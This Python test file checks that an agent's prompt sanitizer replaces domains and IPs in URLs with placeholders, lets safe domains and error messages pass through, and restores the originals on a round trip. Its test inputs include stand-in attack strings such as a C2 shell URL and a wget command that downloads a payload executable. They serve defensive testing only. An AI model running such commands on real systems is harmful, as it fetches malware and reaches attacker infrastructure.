#!/usr/bin/env python3
"""URL/domain sanitization tests — urls=true lockdown mode validation."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(os.path.join(__file__, '..'))))
for key in list(sys.modules.keys()):
    if 'prompt_sanitizer' in key:
        del sys.modules[key]

from agent.prompt_sanitizer import PromptSanitizer

PASS = 0
FAIL = 0

def check(label, condition, detail=""):
    global PASS, FAIL
    if condition:
        PASS += 1
    else:
        print(f"  FAIL [{label}]: {detail}")
        FAIL += 1

print("=" * 60)
print("URL / DOMAIN SANITIZATION TESTS (urls=true)")
print("=" * 60)

# --- URL true positives (red team targets) ---
print("\n--- Red Team URL Detection ---")
rt_urls = [
    ("https://scanme.nmap.org", "nmap target"),
    ("http://evil.c2.server.com:8080/shell.php", "C2 with port"),
    ("https://victim-bank.com/login?next=/admin", "phishing target"),
    ("https://api.targetcorp.com/v1/users?page=1&limit=50", "API endpoint"),
    ("http://192.168.1.100:3000/dashboard", "private IP URL"),
    ("https://raw.githubusercontent.com/hacker/payload/main/e.sh", "raw github"),
    ("wget https://malware.download.site/payload.exe -O /tmp/x", "wget malware"),
]

for url, desc in rt_urls:
    s = PromptSanitizer({"enabled":True, "pii":True, "secrets":True,
                         "infrastructure":True, "urls":True})
    result = s.sanitize_text(url)
    vault = s.get_vault()
    has_domain = any(k.startswith("[DOMAIN_") for k in vault)
    has_ip = any(k.startswith("[IP_") for k in vault)
    check(f"RT {desc}", has_domain or has_ip,
          f"url={url[:50]} vault={list(vault.keys())}")

# --- Domain-only redaction (path/query/fragment preserved) ---
print("\n--- Domain-Only Redaction ---")
domain_tests = [
    ("https://target.com/api/v1/users?page=1",
     "https://[DOMAIN_", "/api/v1/users?page=1", "path+query"),
    ("https://evil.com:8443/admin#section",
     "https://[DOMAIN_", ":8443/admin#section", "port+path+fragment"),
    ("http://api.service.target.com/v2/endpoint",
     "http://[DOMAIN_", "/v2/endpoint", "subdomain URL"),
]

for url, prefix, must_contain, desc in domain_tests:
    s = PromptSanitizer({"enabled":True, "pii":True, "secrets":True,
                         "infrastructure":True, "urls":True})
    result = s.sanitize_text(url)
    vault = s.get_vault()
    check(f"Redact {desc} - placeholder", result.startswith(prefix),
          f"got: {result[:70]}")
    check(f"Redact {desc} - path preserved", must_contain in result,
          f"got: {result[:70]}")
    check(f"Redact {desc} - vault populated", len(vault) > 0,
          f"vault={list(vault.keys())}")

# --- Safe domains (must pass through) ---
print("\n--- Safe Domains Pass Through ---")
safe_cases = [
    "https://example.com/path",
    "https://api.example.com/v1/test",
    "http://test.com/resource",
    "https://www.example.org/index.html",
    "https://test.net/api",
    "ftp://anonymous@ftp.example.com/pub",
]

for url in safe_cases:
    s = PromptSanitizer({"enabled":True, "pii":True, "secrets":True,
                         "infrastructure":True, "urls":True})
    result = s.sanitize_text(url)
    vault = s.get_vault()
    check(f"Safe: {url[:55]}", result == url,
          f"got={result[:60]} vault={list(vault.keys())}")

# --- False positives (must not catch) ---
print("\n--- False Positives ---")
fp_cases = [
    ("Connection refused at https://api.example.com/v1", "error with safe domain"),
    ("version: 1.2.3", "version string"),
    ("npm ERR! code E404", "npm error"),
    ("make: *** [Makefile:42: build] Error 1", "make error"),
    ("Segmentation fault (core dumped)", "segfault"),
    ("MD5: d41d...  *** truncated...  ***", "hash"),
    ("CVE-2024-1234", "CVE identifier"),
]

for text, desc in fp_cases:
    s = PromptSanitizer({"enabled":True, "pii":True, "secrets":True,
                         "infrastructure":True, "urls":True})
    result = s.sanitize_text(text)
    vault = s.get_vault()
    check(f"FP: {desc}", len(vault) == 0,
          f"vault={list(vault.keys())} result={result[:60]}")

# --- Round-trip URL restoration ---
print("\n--- Round-Trip Restoration ---")
s = PromptSanitizer({"enabled":True, "pii":True, "secrets":True,
                     "infrastructure":True, "urls":True})
orig = "scan https://target.com/v1 and https://evil.com:443/path"
sanitized = s.sanitize_text(orig)
restored = s.restore_text(sanitized)
check("URL round-trip", restored == orig,
      f"orig={orig} san={sanitized} rest={restored}")

# --- Stable placeholder IDs ---
print("\n--- Stable Placeholder IDs ---")
s = PromptSanitizer({"enabled":True, "pii":True, "secrets":True,
                     "infrastructure":True, "urls":True})
s.sanitize_text("https://target.com/a")
s.sanitize_text("https://target.com/b")
vault = s.get_vault()
domains = [k for k in vault if k.startswith("[DOMAIN_")]
check("Stable ID (same domain)", len(domains) == 1,
      f"domains={domains}")

print()
print("=" * 60)
print(f"RESULTS: {PASS} passed, {FAIL} failed ({PASS+FAIL} total)")
sys.exit(0 if FAIL == 0 else 1)
